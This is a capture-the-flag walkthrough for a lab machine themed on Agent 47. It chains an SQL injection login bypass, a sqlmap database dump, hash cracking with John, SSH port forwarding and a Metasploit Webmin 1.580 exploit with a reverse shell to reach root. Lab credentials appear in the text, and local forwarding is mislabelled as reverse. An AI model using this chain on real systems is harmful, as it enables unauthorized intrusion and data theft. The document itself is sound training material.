Browse to the web server.

There is a picture of a man with a sniper rifle on the front page.

Snip a picture, and throw it into google reverse image search, to find out it is Agent 47

Next, input ' or 1=1 -- - into the username field to login. Keep the password field blank

Intercept a post request when inputing something into the search bar here.

Copy and paste what burp presents into a .txt file and use the following command to dump the database:
	sqlmap -r info.txt --dbms=mysql --dump

Take the hash and throw it in a txt file

Give it to John with the --format=Raw-SHA256 flag

Now with a username and password, use ssh

ssh -L 10000:localhost:10000 <username>@<ip>
	This will start reverse ssh port forwarding and unblock port 10000

Now you can browse to localhost:10000 and sign in with the credentials

After some looking around, you see this server is running Webmin 1.580

Take a look at https://www.exploit-db.com/exploits/21851 for more details on the vulnerability

I did the following in msf console
	search webm
	use 8
	set username: agent47
	set password: videogamer124
	set rhosts: 127.0.0.1
	set ssl false
	set lhost 10.6.24.197
	set payload 7


Type in run, and you should pop a shell

Browse to /root and cat out the root.txt file
